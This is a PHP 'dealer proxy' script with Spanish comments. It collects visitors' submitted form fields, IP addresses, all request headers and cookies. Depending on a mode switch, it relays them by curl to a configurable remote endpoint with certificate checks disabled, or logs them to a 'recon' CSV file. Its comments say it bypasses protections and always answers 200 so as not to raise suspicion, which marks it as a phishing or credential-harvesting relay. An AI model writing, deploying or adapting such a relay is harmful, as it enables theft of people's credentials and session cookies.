<?php
/**
 * 5ELG - PHP Dealer Proxy (Dual Mode: SENDER/WRITER)
 */

// 1. Configuración de cabeceras para evitar bloqueos de CORS
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, X-Requested-With");

// Responder rápido a peticiones pre-vuelo (Preflight)
if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {
    http_response_code(200);
    exit;
}

// ==========================================
// CONFIGURACIÓN DE MODO
// ==========================================
$MODE = "SENDER";           // Opciones: "SENDER" (reenvía a Node) | "WRITER" (guarda en CSV)
$URI_REZ = "555ELGCODETAG-1"; // URL de destino para SENDER
$CSV_FILE = "logs_recon.csv"; // Nombre del archivo para WRITER
// ==========================================

function getUserIP() {
    $keys = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($keys as $key) {
        if (!empty($_SERVER[$key])) {
            // Manejar listas de IPs en X-Forwarded-For
            return trim(explode(',', $_SERVER[$key])[0]);
        }
    }
    return '0.0.0.0';
}

$IP = getUserIP();
$UA = $_SERVER['HTTP_USER_AGENT'] ?? 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';

// Recopilar datos recibidos
$data = [
    "DEALER_NAME" => "PHP.DEALER.MODULAR",
    "ip"          => $IP,
    "UA"          => urlencode($UA),
    "u"           => $_REQUEST['u'] ?? 'PHP-SINGLE-REQUEST',
    "b"           => $_REQUEST['b'] ?? '',
    "ts"          => date("c"),
    "r"           => $_REQUEST['r'] ?? bin2hex(random_bytes(8)),
    "code"        => $_REQUEST['code'] ?? '',
    "s"           => $_REQUEST['s'] ?? '',
    "data"        => $_REQUEST['data'] ?? '',
    "encoded_req" => json_encode([
        'headers' => $_SERVER,
        'cookies' => $_COOKIE,
        'detected_ip' => $IP
    ])
];

if ($MODE === "SENDER") {
    // --- LÓGICA DE REENVÍO (SENDER) ---
    $post_fields = http_build_query($data);

    $ch = curl_init($URI_REZ);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    // Cabeceras para saltar protecciones y pasar la IP real
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "X-Forwarded-For: $IP",
        "Content-Type: application/x-www-form-urlencoded",
        "Content-Length: " . strlen($post_fields)
    ]);

    // Configuración SSL y Tiempos
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_USERAGENT, $UA);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);

    $response = curl_exec($ch);
    curl_close($ch);

} else if ($MODE === "WRITER") {
    // --- LÓGICA DE GUARDADO (WRITER) ---
    $file_exists = file_exists($CSV_FILE);
    $fp = fopen($CSV_FILE, 'a');

    // Si el archivo es nuevo, escribir cabeceras opcionalmente
    if (!$file_exists) {
        fputcsv($fp, array_keys($data));
    }

    // Escribir los datos en una nueva línea
    fputcsv($fp, $data);
    fclose($fp);
}

// Siempre responder 200 OK al navegador para no levantar sospechas
http_response_code(200);
exit;